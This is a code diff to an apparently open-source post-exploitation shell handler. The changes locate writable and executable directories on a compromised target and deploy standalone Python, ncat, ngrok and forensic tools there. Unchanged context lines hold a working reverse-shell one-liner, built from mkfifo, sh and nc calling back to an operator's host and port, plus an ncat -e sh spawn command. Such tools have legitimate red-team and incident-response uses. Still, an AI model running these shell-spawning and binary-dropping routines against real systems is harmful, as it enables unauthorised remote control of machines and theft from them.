@@ -2344,9 +2344,12 @@ class Session:
 
 			self._bin = defaultdict(lambda: "")
 			self._tmp = None
+			self._exec_tmp = None
 			self._cwd = None
 			self._can_deploy_agent = None
 			self._has_persistent_shell = None
+			self._libc = None
+			self._ncat = None
 
 			self.upgrade_attempted = False
 			self.upgrade_standalone_attempted = False
@@ -2514,6 +2517,13 @@ class Session:
 					self._can_deploy_agent = False
 
 		return self._can_deploy_agent
+
+	@property
+	def libc(self):
+		if self._libc is None and self.system == 'Linux':
+			r = self.exec("ls /lib/ld-musl-* 2>/dev/null | head -1", value=True)
+			self._libc = 'musl' if (isinstance(r, str) and 'ld-musl' in r) else 'glibc'
+		return self._libc
 
 	@property
 	def has_persistent_shell(self):
@@ -2748,26 +2758,18 @@ class Session:
 		if self._tmp is None:
 			if self.OS == "Unix":
 				logger.debug("Trying to find a writable directory on target")
-				tmpname = rand(10)
-				common_dirs = ("/dev/shm", "/tmp", "/var/tmp")
-				for directory in common_dirs:
-					if self.exec(f'echo {tmpname} > {directory}/{tmpname} 2>/dev/null && echo OK', value=True) == 'OK':
-						self.exec(f'rm {directory}/{tmpname}')
-						self._tmp = directory
-						break
-				else:
-					candidate_dirs = self.exec("find / -type d -writable 2>/dev/null")
-					if candidate_dirs:
-						for directory in candidate_dirs.decode(errors="replace").splitlines():
-							if directory in common_dirs:
-								continue
-							if self.exec(f'echo {tmpname} > {directory}/{tmpname} 2>/dev/null && echo OK', value=True) == 'OK':
-								self.exec(f'rm {directory}/{tmpname}')
-								self._tmp = directory
-								break
+				name = rand(10)
+				resolved = self.exec(
+					'for d in /dev/shm /tmp /var/tmp "$HOME" .; do '
+					f'echo x > "$d/{name}" 2>/dev/null && '
+					f'{{ (cd "$d" && pwd); rm -f "$d/{name}"; break; }}; done',
+					value=True)
+				self._tmp = resolved if (isinstance(resolved, str) and resolved.startswith("/")) else False
 				if not self._tmp:
-					self._tmp = False
-					logger.warning("Cannot find writable directory on target...")
+					logger.warning(
+						"No writable directory found. Find one with:\n"
+						"    find / -type d -writable 2>/dev/null | head\n"
+						"then `cd` into it and retry.")
 				else:
 					logger.debug(f"Available writable directory on target: {paint(self._tmp).RED}")
 
@@ -2775,6 +2777,26 @@ class Session:
 				self._tmp = self.exec("echo %TEMP%", force_cmd=True, value=True)
 
 		return self._tmp
+
+	@property
+	def exec_tmp(self):
+		if self._exec_tmp is None and self.OS == "Unix":
+			name = rand(10)
+			resolved = self.exec(
+				'for d in /dev/shm /tmp /var/tmp "$HOME" .; do '
+				f'D="$d/{name}"; mkdir -p "$D" 2>/dev/null || continue; '
+				'{ echo "#!/bin/sh"; echo "exit 0"; } > "$D/t" 2>/dev/null && '
+				'chmod +x "$D/t" 2>/dev/null && "$D/t" >/dev/null 2>&1 && '
+				'{ (cd "$d" && pwd); rm -rf "$D"; break; }; rm -rf "$D" 2>/dev/null; done',
+				value=True)
+			if isinstance(resolved, str) and resolved.startswith("/"):
+				self._exec_tmp = resolved
+			else:
+				logger.warning(
+					"No writable+executable directory found (noexec?). Find one with:\n"
+					"    find / -type d -writable -executable 2>/dev/null | head\n"
+					"then `cd` into it and retry.")
+		return self._exec_tmp
 
 	def agent_only(func):
 		@wraps(func)
@@ -3310,7 +3332,34 @@ class Session:
 
 			return self.subchannel.result
 
+	def _deploy_standalone_python(self, url_key):
+		if not url_key:
+			return False
+		archive = self.need_binary("Standalone Python", URLS[url_key])
+		if not archive:
+			return False
+		path = self.exec(
+			f'D="$(dirname "{archive}")" && tar -xzf "{archive}" -C "$D" 2>/dev/null && '
+			f'rm -f "{archive}" && '
+			f'"$D/python/bin/python3" -c "import sys;print(sys.executable)" 2>/dev/null',
+			value=True
+		)
+		return path if (isinstance(path, str) and path.startswith("/")) else False
+
 	def need_binary(self, name, url):
+		if self.OS == "Unix" and not self.exec_tmp:
+			logger.error(f"No writable+executable directory on the target; cannot deploy {name}")
+			return False
+
+		def make_dest():
+			if self.OS != "Unix":
+				return self.tmp
+			d = self.exec(f'mktemp -d -p "{self.exec_tmp}" 2>/dev/null', value=True)
+			if not (isinstance(d, str) and d.startswith("/")):
+				logger.error(f"Could not create a temp directory for {name}")
+				return None
+			self.uploaded_paths[shlex.quote(d)] = int(time.time())
+			return d
 		_options = (
 			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
 			f"\n  2) Upload local {name} binary"
@@ -3322,14 +3371,20 @@ class Session:
 			answer = ask("Select action: ")
 
 			if answer == "1":
-				uploaded = self.upload(url, remote_path="/var/tmp")
+				dest = make_dest()
+				if not dest:
+					return False
+				uploaded = self.upload(url, remote_path=dest)
 				return uploaded[0] if uploaded else False
 
 			elif answer == "2":
 				local_path = ask(f"Enter {name} local path: ")
 				if local_path:
 					if os.path.exists(local_path):
-						uploaded = self.upload(local_path, remote_path=self.tmp)
+						dest = make_dest()
+						if not dest:
+							return False
+						uploaded = self.upload(local_path, remote_path=dest)
 						return uploaded[0] if uploaded else False
 					else:
 						logger.error("The local path does not exist...")
@@ -3450,23 +3505,16 @@ class Session:
 			if not self.upgrade_standalone_attempted:
 				self.upgrade_standalone_attempted = True
 				logger.error("Cannot deploy agent with remote Python. Select an action below:")
-				python_binary = PYTHON_STANDALONE_BINARIES.get((self.system, self.arch))
+				dyn_key = PYTHON_STANDALONE_BINARIES.get((self.system, self.arch, self.libc))
+				python_binary = self._deploy_standalone_python(dyn_key)
 				if not python_binary:
-					logger.error(f'Unsupported target platform: {self.system} {self.arch}')
+					logger.error(f'Failed to deploy standalone python for {self.system} {self.arch} ({self.libc})')
 					return False
 
-				python_binary = self.need_binary("Standalone Python", URLS[python_binary])
-				if python_binary:
-					if python_binary.endswith(".gz"):
-						python_binary = self.exec(f'PY_TMP="/var/tmp" && tar -xzf "{python_binary}" -C "$PY_TMP" && export PATH="$PY_TMP/python/bin:$PATH" && ls $PY_TMP/python/bin/python3', value=True)
-						if not (isinstance(python_binary, str) and python_binary.startswith("/")):
-							logger.error("Failed to deploy standalone python...")
-							python_binary = None
-					if python_binary:
-						self.standalone_python = python_binary
-						self._can_deploy_agent = None
-						self._bin['python3'] = python_binary
-						return self.upgrade()
+				self.standalone_python = python_binary
+				self._can_deploy_agent = None
+				self._bin['python3'] = python_binary
+				return self.upgrade()
 
 			logger.error("Cannot deploy agent...")
 			if readline:
@@ -4355,20 +4403,13 @@ class Session:
 					cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
 				elif self.bin['sh']:
 					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
-					ncat_binary = self.tmp + '/ncat'
-					if not self.exec(f"test -f {ncat_binary} || echo x"):
-						cmd = ncat_cmd.format(ncat_binary)
-					else:
+					if not (self._ncat and not self.exec(f"test -x {self._ncat} || echo x")):
 						logger.warning("ncat is not available on the target")
-						ncat_binary = self.need_binary(
-							"ncat",
-							URLS['ncat']
-							)
-						if ncat_binary:
-							cmd = ncat_cmd.format(ncat_binary)
-						else:
-							logger.error("Spawning shell aborted")
-							return False
+						self._ncat = self.need_binary("ncat", URLS['ncat'])
+					if not self._ncat:
+						logger.error("Spawning shell aborted")
+						return False
+					cmd = ncat_cmd.format(self._ncat)
 				else:
 					logger.error("No available shell binary is present...")
 					return False
@@ -5256,20 +5297,25 @@ class uac(Module):
 			if not session.system == 'Linux':
 				logger.error(f"This modules runs only on Linux, not on {session.system}.")
 				return False
-			uploaded = session.upload(URLS['uac_linux'], remote_path=session.tmp)
+			if not session.exec_tmp:
+				logger.error("No writable+executable directory on the target (noexec?)")
+				return False
+			uploaded = session.upload(URLS['uac_linux'], remote_path=session.exec_tmp)
 			if not uploaded:
 				logger.error("Failed to upload UAC")
 				return False
 			path = uploaded[0]
-			result = session.exec(f"tar xf {path} -C {session.tmp} >/dev/null", value=True)
+			result = session.exec(f"tar xf {path} -C {session.exec_tmp} >/dev/null", value=True)
 			if not result:
-				logger.info(f"UAC successfully extracted on {session.tmp}")
+				session.exec(f"rm -f {path}")
+				logger.info(f"UAC successfully extracted on {session.exec_tmp}")
 			else:
-				logger.error(f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
+				logger.error(f"Extraction to {session.exec_tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
 				return False
 			# UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
 			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
 			base = re.sub(r'\.tar\.gz$', '', path)
+			session.uploaded_paths[base] = int(time.time())
 			cmd = f"cd {base}; ./uac -u -p ir_triage --output-format tar {session.tmp}"
 			#session.exec(cmd)
 			tf = f"/tmp/{rand(8)}"
@@ -5293,11 +5339,14 @@ class linux_procmemdump(Module):
 			if not session.system == 'Linux':
 				logger.error(f"This modules runs only on Linux, not on {session.system}.")
 				return False
-			session.upload(URLS['linux_procmemdump'], remote_path=session.tmp)
+			if not session.exec_tmp:
+				logger.error("No writable+executable directory on the target (noexec?)")
+				return False
+			session.upload(URLS['linux_procmemdump'], remote_path=session.exec_tmp)
 			print(session.exec(f"ps -eo pid,cmd", value=True))
 			logger.info(f"Please provide the PID of the process to be acquired:")
 			PID = input("PID: ")
-			session.exec(f"{session.tmp}/linux_procmemdump.sh -p {PID} -s -d {session.tmp}")
+			session.exec(f"{session.exec_tmp}/linux_procmemdump.sh -p {PID} -s -d {session.tmp}")
 			logger.info(f"Strings of the process dump will be stored at {session.tmp}/{PID}/")
 		else:
 			logger.error("This module runs only on Unix shells")
@@ -5407,7 +5456,9 @@ class ngrok(Module):
 			if not session.system == 'Linux':
 				logger.error(f"This modules runs only on Linux, not on {session.system}.")
 				return False
-
+			if not session.exec_tmp:
+				logger.error("No writable+executable directory on the target (noexec?)")
+				return False
 			_, archive = url_to_bytes(URLS['ngrok_linux'])
 			if not archive:
 				logger.error("Failed to download ngrok")
@@ -5417,15 +5468,15 @@ class ngrok(Module):
 				if f is None:
 					logger.error("File 'ngrok' not found in downloaded archive")
 					return
-				session.upload(URLS['ngrok_linux'], url_to_bytes_fn=lambda x: ('ngrok', f.read()), remote_path=session.tmp)
+				session.upload(URLS['ngrok_linux'], url_to_bytes_fn=lambda x: ('ngrok', f.read()), remote_path=session.exec_tmp)
 
 			token = input("Authtoken: ")
-			session.exec(f"{session.tmp}/ngrok config add-authtoken {token}")
+			session.exec(f"{session.exec_tmp}/ngrok config add-authtoken {token}")
 			logger.info("Provide a TCP port number to be exposed in ngrok cloud:")
 			tcp_port = input("tcp_port: ")
 			#logger.info("Indicate if a TCP or an HTTP tunnel is required?:")
 			#tunnel = input("tunnel: ")
-			cmd = f"cd {session.tmp}; ./ngrok tcp {tcp_port} --log=stdout"
+			cmd = f"cd {session.exec_tmp}; ./ngrok tcp {tcp_port} --log=stdout"
 			print(cmd)
 			#session.exec(cmd)
 			tf = f"/tmp/{rand(8)}"
@@ -5575,7 +5626,8 @@ class cleanup(Module):
 					else:
 						logger.error(f"Error deleting '{p}'")
 				else:
-					logger.error(f"'{p}' does not exist anymore")
+					logger.debug(f"'{p}' already gone")
+					del session.uploaded_paths[item]
 			else:
 				response = session.exec(f'cmd /Q /D /C if exist "{p}" (echo exists) else (echo no)', force_cmd=True, value=True)
 				if response == 'exists':
@@ -5598,7 +5650,8 @@ class cleanup(Module):
 						logger.error(f"Error deleting '{p}'")
 
 				else:
-					logger.error(f"'{p}' does not exist anymore")
+					logger.debug(f"'{p}' already gone")
+					del session.uploaded_paths[item]
 
 class FileServer:
 	def __init__(self, *items, port=None, host=None, url_prefix=None, quiet=False, upload=False, upload_dir=None):
@@ -6736,8 +6789,10 @@ MAX_CMD_PROMPT_LEN = 335
 LOG_TIMESTAMP_FMT = "%Y-%m-%d %H:%M:%S: "
 LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
 URLS = {
-	'python_linux_x86_64':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-x86_64-unknown-linux-musl-install_only_stripped.tar.gz',
-	'python_linux_aarch64':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-aarch64-unknown-linux-musl-install_only_stripped.tar.gz',
+	'python_linux_x86_64_glibc':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-x86_64-unknown-linux-gnu-install_only_stripped.tar.gz',
+	'python_linux_x86_64_musl':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-x86_64-unknown-linux-musl-install_only_stripped.tar.gz',
+	'python_linux_aarch64_glibc':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-aarch64-unknown-linux-gnu-install_only_stripped.tar.gz',
+	'python_linux_aarch64_musl':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-aarch64-unknown-linux-musl-install_only_stripped.tar.gz',
 	'python_macos_x86_64':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-x86_64-apple-darwin-install_only_stripped.tar.gz',
 	'python_macos_aarch64':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-aarch64-apple-darwin-install_only_stripped.tar.gz',
 	'linpeas':	"https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
@@ -6786,8 +6841,10 @@ URLS = {
 }
 
 PYTHON_STANDALONE_BINARIES = {
-	('Linux', 'x86_64'): 'python_linux_x86_64',
-	('Linux', 'aarch64'): 'python_linux_aarch64',
+	('Linux', 'x86_64', 'glibc'): 'python_linux_x86_64_glibc',
+	('Linux', 'x86_64', 'musl'): 'python_linux_x86_64_musl',
+	('Linux', 'aarch64', 'glibc'): 'python_linux_aarch64_glibc',
+	('Linux', 'aarch64', 'musl'): 'python_linux_aarch64_musl',
 
 	('Darwin', 'x86_64'): 'python_macos_x86_64',
 	('Darwin', 'arm64'): 'python_macos_aarch64',
